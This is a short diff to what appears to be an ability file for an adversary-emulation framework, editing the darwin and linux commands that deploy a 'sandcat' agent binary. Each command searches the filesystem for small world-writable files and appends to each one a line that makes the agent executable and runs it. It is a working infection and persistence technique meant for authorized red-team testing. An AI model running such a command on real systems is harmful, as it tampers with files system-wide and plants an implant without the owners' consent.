@@ -10,9 +10,9 @@
   executors:
     darwin:
       command: |
-        find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\n" "chmod +x #{files}/sandcat-darwin && #{files}/sandcat-darwin" >> "{}"; ls "{}" ' \; | echo "complete"
+        find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\n" "chmod +x sandcat-darwin && sandcat-darwin" >> "{}"; ls "{}" ' \; | echo "complete"
       payload: sandcat-darwin
     linux:
       command: |
-        find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\n" "chmod +x #{files}/sandcat-linux && #{files}/sandcat-linux" >> "{}"; ls "{}" ' \; | echo "complete"
+        find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\n" "chmod +x sandcat-linux && sandcat-linux" >> "{}"; ls "{}" ' \; | echo "complete"
       payload: sandcat-linux
